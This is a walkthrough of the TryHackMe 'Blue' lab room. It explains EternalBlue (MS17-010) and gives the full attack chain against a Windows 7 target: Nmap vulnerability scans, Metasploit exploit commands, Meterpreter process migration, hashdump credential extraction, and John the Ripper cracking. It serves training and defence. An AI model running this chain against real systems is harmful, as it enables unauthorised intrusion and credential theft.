# Blue

## Overview

Blue is one of the most well-known beginner rooms on TryHackMe. It walks through exploiting a Windows 7 machine vulnerable to **EternalBlue (MS17-010)** — a critical SMBv1 flaw that allows unauthenticated remote code execution with SYSTEM-level privileges. The room covers a full attack chain: reconnaissance, exploitation via Metasploit, privilege escalation, credential dumping, and hash cracking.

This room is not a boot2root CTF — it's a structured, educational walkthrough designed to introduce the foundational exploitation workflow using real-world vulnerability classes.

---

## Topics Covered

- Network scanning and vulnerability detection with Nmap
- SMB protocol and the SMBv1 vulnerability (MS17-010 / EternalBlue)
- Exploitation using the Metasploit Framework
- Meterpreter post-exploitation (shell upgrade, process migration)
- Credential dumping with `hashdump`
- Offline password cracking with John the Ripper
- Flag hunting on a compromised Windows system

---

## Key Concepts

### EternalBlue (MS17-010)

EternalBlue is a remote code execution exploit targeting a critical flaw in Microsoft's implementation of the **SMB (Server Message Block)** protocol — specifically SMBv1. It was originally developed by the NSA (attributed to the Equation Group) and leaked publicly by the Shadow Brokers in April 2017, roughly one month after Microsoft released patch **MS17-010**.

The vulnerability arises from how SMBv1 handles certain transaction requests. By sending specially crafted SMB packets, an attacker can trigger a **kernel-level buffer overflow**, overwrite memory, and execute arbitrary shellcode — all without any authentication.

The exploit grants access as **NT AUTHORITY\SYSTEM**, the highest privilege level in Windows user mode, and additionally achieves control at **ring 0** (kernel level).

EternalBlue's real-world notoriety comes from its use in the **WannaCry** ransomware campaign (May 2017), which caused an estimated $4–8 billion in damages globally.

**CVE Identifiers:**
| CVE | Description |
|-----|-------------|
| CVE-2017-0144 | Primary RCE via SMBv1 transaction request handling |
| CVE-2017-0145 | Related SMB protocol vulnerability |
| CVE-2017-0146 | Additional associated SMB flaw |

**Affected Systems:** Windows Vista, Windows 7, Windows Server 2008, Windows Server 2008 R2, Windows 8.1, Windows Server 2012

### SMB and SMBv1

SMB (Server Message Block) is a network file-sharing protocol used primarily on Windows for sharing files, printers, and other resources. SMBv1 is the original version of the protocol, now deprecated due to its severe security flaws. Port **445/TCP** is where SMB typically listens.

### Meterpreter

Meterpreter is an advanced, in-memory payload used by Metasploit. It operates entirely in RAM — it doesn't write to disk — which makes it harder to detect. It provides a rich post-exploitation interface including file system access, process management, credential dumping, pivoting, and more.

### NTLM Hashes

Windows does not store passwords in plaintext. Instead, it stores **NTLM (NT LAN Manager) hashes** of user passwords in the **SAM (Security Account Manager)** database. These hashes can be extracted post-exploitation and cracked offline to recover plaintext passwords.

NTLM hash format:
```
username:RID:LM_hash:NT_hash:::
```

### Process Migration

After gaining a Meterpreter shell, migrating to a more stable process (such as a SYSTEM-owned process like `spoolsv.exe`) helps maintain persistence and avoid losing the session if the original payload process is terminated.

---

## Important Terminology

| Term | Meaning |
|------|---------|
| MS17-010 | Microsoft Security Bulletin identifier for the EternalBlue patch |
| EternalBlue | The exploit name; originally an NSA tool |
| SMBv1 | Server Message Block version 1 — the vulnerable protocol |
| NSE | Nmap Scripting Engine — used to run vulnerability detection scripts |
| Meterpreter | Metasploit's in-memory post-exploitation payload |
| hashdump | Meterpreter command to extract NTLM password hashes from the SAM |
| John the Ripper | Password cracking tool; can crack NTLM hashes offline |
| SYSTEM | Highest Windows user-mode privilege; equivalent to root on Linux |
| SAM | Security Account Manager — Windows database that stores password hashes |
| Shadow Brokers | Unknown group that leaked NSA hacking tools in 2017 |

---

## Practical Examples / Demonstrations

### Task 1 — Recon

Start with an Nmap scan to identify open ports and services. The machine does not respond to ICMP, so use `-Pn` to skip the ping check.

```bash
nmap -sV -Pn --script=vuln <target_ip>
```

Or target the SMB ports directly once identified:

```bash
nmap -p 135,139,445 --script=vuln <target_ip>
```

**Key Nmap flags:**
- `-sV` — detect service versions
- `-Pn` — skip host discovery (no ping)
- `--script=vuln` — run NSE vulnerability detection scripts
- `-oN output.txt` — save output to file

Expected output: The scan will identify the machine as vulnerable to **ms17-010**, with a reference to CVE-2017-0143 or CVE-2017-0144.

---

### Task 2 — Gain Access

Launch Metasploit and load the EternalBlue exploit module:

```bash
msfconsole
```

```
msf6 > search ms17-010
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(...) > show options
msf6 exploit(...) > set RHOSTS <target_ip>
msf6 exploit(...) > set LHOST <your_ip>
msf6 exploit(...) > run
```

On success, you receive a **Meterpreter session** running as `NT AUTHORITY\SYSTEM`.

---

### Task 3 — Escalate (Shell Upgrade and Process Migration)

If you get a plain shell instead of Meterpreter, background the session and upgrade it:

```
msf6 > sessions -l                    # list active sessions
msf6 > use post/multi/manage/shell_to_meterpreter
msf6 > set SESSION <session_id>
msf6 > run
```

Once in a Meterpreter session, migrate to a stable SYSTEM-owned process:

```
meterpreter > ps                      # list running processes
meterpreter > migrate <PID>           # migrate to a target process (e.g., spoolsv.exe)
meterpreter > getuid                  # confirm NT AUTHORITY\SYSTEM
```

---

### Task 4 — Cracking

Dump the NTLM password hashes from the SAM database:

```
meterpreter > hashdump
```

Example output:
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
```

The format is `username:RID:LM_hash:NT_hash`. Copy the hash values and crack them offline with John the Ripper:

```bash
john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

Or use the built-in Metasploit John module:

```
meterpreter > run post/windows/gather/hashdump
```

---

### Task 5 — Find the Flags

With SYSTEM access, navigate the filesystem to find hidden flags. Common locations on the Blue room machine:

```
meterpreter > shell
C:\> dir /s /b flag*.txt
```

Or use Meterpreter's search:

```
meterpreter > search -f flag*.txt
```

Flags are typically hidden in directories like:
- `C:\`
- `C:\Windows\System32\config`
- `C:\Users\Jon\Documents`

---

## Workflow / Process

```
Recon (Nmap + NSE vuln scan)
        |
        v
Confirm ms17-010 vulnerability on port 445
        |
        v
Launch Metasploit → use ms17_010_eternalblue
        |
        v
Set RHOSTS and LHOST → run exploit
        |
        v
Receive Meterpreter session as NT AUTHORITY\SYSTEM
        |
        v
Process migration (stabilize session)
        |
        v
hashdump → extract NTLM hashes
        |
        v
Crack hashes with John the Ripper
        |
        v
Find and retrieve flags
```

---

## Real-World Relevance

EternalBlue is one of the most impactful vulnerabilities ever discovered. It is directly responsible for:

- **WannaCry (2017)** — ransomware that infected over 200,000 systems in 150 countries, crippling hospitals, telecoms, and government infrastructure
- **NotPetya (2017)** — destructive malware disguised as ransomware that caused over $10 billion in damages
- **Multiple ongoing APT campaigns** — nation-state actors continue to use EternalBlue years after the patch was released, exploiting unpatched and legacy systems

From a defensive perspective, this room highlights why:
- Legacy protocol support (SMBv1) must be disabled
- Patch management is critical
- Network segmentation limits lateral movement even when one host is compromised

From an offensive/red team perspective, SMB vulnerabilities remain a common initial access vector when scanning internal networks with unpatched Windows hosts.

---

## Key Learnings

- Nmap's NSE `--script=vuln` is a fast way to identify known CVEs on open services
- EternalBlue exploits a kernel-level buffer overflow in SMBv1 — no credentials required
- Metasploit's `ms17_010_eternalblue` module delivers a Meterpreter shell as SYSTEM
- Process migration ensures session stability post-exploitation
- `hashdump` extracts NTLM hashes from the SAM database
- NTLM hashes can be cracked offline using John the Ripper with a wordlist like `rockyou.txt`
- SYSTEM-level access means no file or directory on the machine is off-limits

---

## Additional Notes

- The Blue room machine has ICMP disabled — always use `-Pn` in Nmap when scanning it
- SMBv1 is disabled by default in Windows 10 and Windows Server 2019+; older systems may still have it enabled
- The `aad3b435b51404eeaad3b435b51404ee` value in the LM hash field means the LM hash is blank/empty — this is normal on modern Windows systems where LM hashing is disabled
- If the exploit fails on the first attempt, retry — the exploit involves heap grooming which can be timing-sensitive
- MS17-010 is also exploitable without Metasploit using standalone Python scripts (e.g., from the `worawit` GitHub repo), useful when Metasploit is not available

---

## Conclusion

Blue provides a clean, end-to-end introduction to Windows exploitation using one of the most historically significant vulnerabilities in cybersecurity. Working through it builds familiarity with the core offensive workflow: scan, identify, exploit, escalate, dump credentials, and post-exploit. The techniques covered here — Metasploit, Meterpreter, hashdump, and offline hash cracking — are foundational skills that appear repeatedly across CTFs, OSCP, and real-world penetration testing engagements.

The broader lesson is that a single unpatched SMB port, exposed on a network, can result in complete system compromise with no user interaction required.
